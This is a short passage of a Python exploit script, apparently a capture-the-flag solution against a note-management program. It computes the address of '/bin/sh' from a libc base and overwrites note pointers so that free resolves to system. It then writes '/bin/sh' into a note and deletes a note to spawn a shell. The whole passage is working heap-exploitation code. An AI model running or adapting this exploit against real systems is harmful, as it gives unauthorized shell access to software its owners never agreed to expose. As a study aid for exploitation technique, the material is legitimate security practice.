...
binsh_addr = libc_base + 0x12d02f
binsh_addr = 0x804b1a0
print("[!] /bin/sh is at:  0x%x" % binsh_addr)

modify_note(1, p32(0x0) + p32(0x0804b120) + p32(free_addr) + p32(libc_addr) + p32(binsh_addr))
modify_note(2, p32(libc_system))
modify_note(6, "/bin/sh\x00")
new_note(4, "")
delete(4)
